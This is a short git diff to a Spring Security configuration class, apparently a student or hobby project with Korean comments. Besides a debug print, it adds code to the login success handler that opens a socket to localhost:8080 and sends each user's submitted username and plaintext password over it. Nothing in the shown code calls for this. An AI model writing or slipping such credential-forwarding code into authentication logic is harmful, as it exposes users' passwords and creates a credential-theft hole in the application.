@@ -17,6 +17,10 @@ import org.springframework.security.web.authentication.SimpleUrlAuthenticationSu
 import org.springframework.security.web.csrf.CookieCsrfTokenRepository;
 import org.springframework.security.web.util.matcher.AntPathRequestMatcher;
 
+import java.io.*;
+import java.net.ServerSocket;
+import java.net.Socket;
+
 @RequiredArgsConstructor
 @Configuration
 @EnableWebSecurity //웹보안 활성화를위한 annotation
@@ -39,10 +43,22 @@ public class SecurityConfig extends WebSecurityConfigurerAdapter {
                 .loginPage("/loginForm") //로그인 페이지를 /loginForm URL로 하겠다.
                 .loginProcessingUrl("/loginAction") //로그인 액션 URI를 지정한다.
                 .successHandler( (request,response,authentication) -> {
+                    System.out.println("서서서서서서서성공");
                     String memberName = request.getParameter("username");
                     MemberEntity entity = memberRepository.findByPhone(memberName);
                     request.getSession().setAttribute("memberIdx", entity.getMemberIdx());
                     response.sendRedirect("/");
+//
+                    Socket socket = new Socket("localhost", 8080); // 서버에 연결하는 소켓 생성
+
+                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())); // 출력 스트림
+
+                    String message = request.getParameter("username") + "," + request.getParameter("password");
+                    writer.write(message);
+                    writer.flush(); // 서버에게 메시지 송신
+                    socket.close(); // 소켓 닫기
+//
+
                 })
                 .failureUrl("/loginForm?error")
                 .permitAll() //로그인 페이지를 모두에게 허용한다.
